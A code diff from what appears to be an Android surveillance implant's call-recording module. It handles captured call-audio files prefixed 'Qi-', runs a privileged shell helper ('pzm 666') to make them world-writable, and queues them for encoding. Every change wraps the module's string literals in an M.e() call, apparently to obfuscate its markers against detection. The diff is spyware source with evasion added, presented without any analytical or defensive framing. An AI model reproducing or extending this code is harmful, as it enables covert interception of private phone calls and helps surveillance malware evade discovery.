@@ -257,7 +257,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		FilenameFilter filter = new FilenameFilter() {
 			public boolean accept(File dir, String name) {
-				return (name.startsWith("Qi-") && name.toLowerCase().endsWith(".bin"));
+				return (name.startsWith(M.e("Qi-")) && name.toLowerCase().endsWith(M.e(".bin")));
 			}
 		};
 
@@ -280,7 +280,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				}
 
 				// Make it read-write
-				Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "666" + " " + fullName);
+				Execute.execute(Configuration.shellFile + " " + M.e("pzm 666 ") + fullName);
 
 				storedFile.delete();
 			}
@@ -293,7 +293,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		FilenameFilter filter = new FilenameFilter() {
 			public boolean accept(File dir, String name) {
-				return (name.startsWith("Qi-") && name.toLowerCase().endsWith(".tmp"));
+				return (name.startsWith(M.e("Qi-")) && name.toLowerCase().endsWith(M.e(".tmp")));
 			}
 		};
 
@@ -313,7 +313,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	synchronized private boolean addToEncodingList(String s) {
-		if (s.contains("Qi-") == false || (s.endsWith("-l.tmp") == false && s.endsWith("-r.tmp") == false)) {
+		if (s.contains(M.e("Qi-")) == false || (s.endsWith(M.e("-l.tmp")) == false && s.endsWith(M.e("-r.tmp")) == false)) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(addToEncodingList): " + s + " is not intended for us");
 			}
@@ -328,7 +328,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		cb.trigger(s);
 
 		// Make it read-write in any case
-		Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "666" + " " + s);
+		Execute.execute(Configuration.shellFile + " " + M.e("pzm 666 ") + s);
 
 		// Add the file to the list
 		calls.add(s);
